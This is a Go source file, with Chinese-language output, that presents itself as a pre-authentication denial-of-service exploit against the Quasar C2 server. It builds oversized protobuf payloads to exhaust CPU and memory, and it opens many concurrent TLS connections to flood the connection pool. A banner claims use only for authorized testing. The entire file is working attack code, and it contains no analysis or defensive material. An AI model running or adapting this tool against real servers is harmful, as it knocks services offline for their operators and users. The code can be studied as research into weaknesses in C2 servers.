package main

import (
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

var (
	targetIP         string
	targetPort       int
	attackMode       int
	threads          int
	prebuiltPayload1 []byte
	prebuiltPayload2 []byte
	prebuiltPayload3 []byte
)

func init() {
	flag.StringVar(&targetIP, "ip", "127.0.0.1", "目标服务器IP")
	flag.IntVar(&targetPort, "port", 1, "目标服务器端口")
	flag.IntVar(&attackMode, "mode", 2, "攻击模式: 1=Protobuf CPU耗尽 2=内存耗尽 3=连接洪水")
	flag.IntVar(&threads, "threads", 10, "并发连接数")
}

func buildMaliciousClientIdentificationCPU() []byte {
	msg := &ProtobufMessage{}

	largeStr := make([]byte, 256*1024)
	for i := range largeStr {
		largeStr[i] = byte(i % 256)
	}

	strValue := string(largeStr)
	for i := 1; i <= 18; i++ {
		msg.AddString(i, strValue)
	}

	typeMsg := &ProtobufMessage{}
	typeMsg.AddInt32(1, 14)
	typeMsg.AddField(2, 2, msg.Bytes())

	return typeMsg.Bytes()
}

func buildMaliciousClientIdentificationMemory() []byte {
	msg := &ProtobufMessage{}

	chunk := make([]byte, 512*1024)
	for i := range chunk {
		chunk[i] = 'M'
	}

	for i := 1; i <= 8; i++ {
		msg.AddString(i, string(chunk))
	}

	typeMsg := &ProtobufMessage{}
	typeMsg.AddInt32(1, 14)
	typeMsg.AddField(2, 2, msg.Bytes())

	return typeMsg.Bytes()
}

func buildJunkMessage() []byte {
	msg := &ProtobufMessage{}

	chunk := make([]byte, 256*1024)
	for i := range chunk {
		chunk[i] = byte(i % 256)
	}

	strValue := string(chunk)
	for i := 1; i <= 16; i++ {
		msg.AddString(i, strValue)
	}

	typeMsg := &ProtobufMessage{}
	typeMsg.AddInt32(1, 14)
	typeMsg.AddField(2, 2, msg.Bytes())

	return typeMsg.Bytes()
}

type ProtobufMessage struct {
	data []byte
}

func (p *ProtobufMessage) AddField(fieldNumber int, wireType int, value []byte) {
	tag := (fieldNumber << 3) | wireType
	p.data = append(p.data, encodeVarint(uint64(tag))...)
	if wireType == 2 {
		p.data = append(p.data, encodeVarint(uint64(len(value)))...)
	}
	p.data = append(p.data, value...)
}

func (p *ProtobufMessage) AddString(fieldNumber int, value string) {
	p.AddField(fieldNumber, 2, []byte(value))
}

func (p *ProtobufMessage) AddInt32(fieldNumber int, value int32) {
	buf := make([]byte, binary.MaxVarintLen32)
	n := binary.PutVarint(buf, int64(value))
	p.AddField(fieldNumber, 0, buf[:n])
}

func (p *ProtobufMessage) AddBytes(fieldNumber int, value []byte) {
	p.AddField(fieldNumber, 2, value)
}

func (p *ProtobufMessage) Bytes() []byte {
	return p.data
}

func encodeVarint(value uint64) []byte {
	buf := make([]byte, binary.MaxVarintLen64)
	n := binary.PutUvarint(buf, value)
	return buf[:n]
}

func sendMessage(conn net.Conn, payload []byte) error {
	header := make([]byte, 4)
	binary.LittleEndian.PutUint32(header, uint32(len(payload)))

	if _, err := conn.Write(header); err != nil {
		return err
	}

	if _, err := conn.Write(payload); err != nil {
		return err
	}

	return nil
}

func attackWorkerMode1(id int, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()

	target := fmt.Sprintf("%s:%d", targetIP, targetPort)
	config := &tls.Config{InsecureSkipVerify: true}

	for i := 0; i < 10; i++ {
		conn, err := tls.Dial("tcp", target, config)
		if err != nil {
			if i == 0 {
				results <- fmt.Sprintf("[线程%d] 连接失败: %v", id, err)
			}
			continue
		}

		sendMessage(conn, prebuiltPayload1)
		conn.Close()

		if i == 0 {
			results <- fmt.Sprintf("[线程%d] 已发送载荷 (%d 字节)", id, len(prebuiltPayload1))
		}

		time.Sleep(200 * time.Millisecond)
	}

	results <- fmt.Sprintf("[线程%d] 完成 10 次攻击", id)
}

func attackWorkerMode2(id int, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()

	target := fmt.Sprintf("%s:%d", targetIP, targetPort)
	config := &tls.Config{InsecureSkipVerify: true}

	for i := 0; i < 10; i++ {
		conn, err := tls.Dial("tcp", target, config)
		if err != nil {
			if i == 0 {
				results <- fmt.Sprintf("[线程%d] 连接失败: %v", id, err)
			}
			continue
		}

		sendMessage(conn, prebuiltPayload2)
		conn.Close()

		if i == 0 {
			results <- fmt.Sprintf("[线程%d] 已发送载荷 (%d 字节)", id, len(prebuiltPayload2))
		}

		time.Sleep(200 * time.Millisecond)
	}

	results <- fmt.Sprintf("[线程%d] 完成 10 次攻击", id)
}

func attackWorkerMode3(id int, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()

	target := fmt.Sprintf("%s:%d", targetIP, targetPort)
	config := &tls.Config{InsecureSkipVerify: true}

	for i := 0; i < 100; i++ {
		conn, err := tls.Dial("tcp", target, config)
		if err != nil {
			continue
		}

		sendMessage(conn, prebuiltPayload3)
		conn.Close()

		if i%25 == 0 {
			results <- fmt.Sprintf("[线程%d] 已发送 %d 次", id, i)
		}
	}

	results <- fmt.Sprintf("[线程%d] 完成 100 次攻击", id)
}

func exploit() error {
	fmt.Printf("[*] 目标: %s:%d\n", targetIP, targetPort)
	fmt.Printf("[*] 并发数: %d\n", threads)
	fmt.Printf("[*] 攻击模式: %d\n\n", attackMode)

	var wg sync.WaitGroup
	results := make(chan string, threads*10)

	switch attackMode {
	case 1:
		fmt.Println("[*] 模式1: Protobuf CPU耗尽攻击")
		fmt.Println("[*] 发送大量复杂嵌套字段，耗尽服务端CPU")
		fmt.Println()

		for i := 0; i < threads; i++ {
			wg.Add(1)
			go attackWorkerMode1(i, &wg, results)
			time.Sleep(100 * time.Millisecond)
		}

	case 2:
		fmt.Println("[*] 模式2: 内存耗尽攻击")
		fmt.Println("[*] 发送大量超大字符串字段，耗尽服务端内存")
		fmt.Println()

		for i := 0; i < threads; i++ {
			wg.Add(1)
			go attackWorkerMode2(i, &wg, results)
			time.Sleep(50 * time.Millisecond)
		}

	case 3:
		fmt.Println("[*] 模式3: 连接洪水攻击")
		fmt.Println("[*] 大量连接发送垃圾数据，耗尽连接池")
		fmt.Println()

		for i := 0; i < threads; i++ {
			wg.Add(1)
			go attackWorkerMode3(i, &wg, results)
		}

	default:
		return fmt.Errorf("无效攻击模式: %d", attackMode)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for msg := range results {
		fmt.Println(msg)
	}

	fmt.Println("\n[+] 攻击完成")
	fmt.Println("[*] 检查目标服务端:")
	fmt.Println("    - CPU使用率是否异常升高?")
	fmt.Println("    - 内存占用是否持续增长?")
	fmt.Println("    - GUI是否无响应?")
	fmt.Println("    - 进程是否崩溃?")

	return nil
}

func main() {
	flag.Parse()

	banner := `
╔═══════════════════════════════════════════════════════════╗
║   Quasar C2 服务端 Release模式 拒绝服务漏洞利用工具       ║
║   漏洞: Protobuf反序列化资源耗尽 (认证前)                 ║
║   影响: CPU耗尽 / 内存耗尽 / 连接池耗尽                   ║
║   适用: DEBUG + Release 模式                              ║
║   仅用于授权安全测试                                      ║
╚═══════════════════════════════════════════════════════════╝
`
	fmt.Println(banner)

	fmt.Printf("[配置] 目标: %s:%d\n", targetIP, targetPort)
	fmt.Printf("[配置] 攻击模式: %d\n", attackMode)
	fmt.Printf("[配置] 并发线程: %d\n", threads)
	fmt.Println()

	fmt.Println("攻击模式说明:")
	fmt.Println("  1 = Protobuf CPU耗尽 (推荐)")
	fmt.Println("  2 = 内存耗尽")
	fmt.Println("  3 = 连接洪水")
	fmt.Println()

	fmt.Println("[*] 预构造载荷...")
	startTime := time.Now()
	prebuiltPayload1 = buildMaliciousClientIdentificationCPU()
	prebuiltPayload2 = buildMaliciousClientIdentificationMemory()
	prebuiltPayload3 = buildJunkMessage()
	elapsed := time.Since(startTime)

	fmt.Printf("[+] 载荷构造完成 (耗时 %.2f 秒)\n", elapsed.Seconds())
	fmt.Printf("    - 模式1载荷: %.2f MB\n", float64(len(prebuiltPayload1))/1024/1024)
	fmt.Printf("    - 模式2载荷: %.2f MB\n", float64(len(prebuiltPayload2))/1024/1024)
	fmt.Printf("    - 模式3载荷: %.2f MB\n", float64(len(prebuiltPayload3))/1024/1024)
	fmt.Println()

	fmt.Print("[!] 警告: 仅用于授权测试\n")
	fmt.Print("[!] 按回车继续...")
	fmt.Scanln()

	if err := exploit(); err != nil {
		fmt.Printf("[-] 错误: %v\n", err)
		os.Exit(1)
	}
}
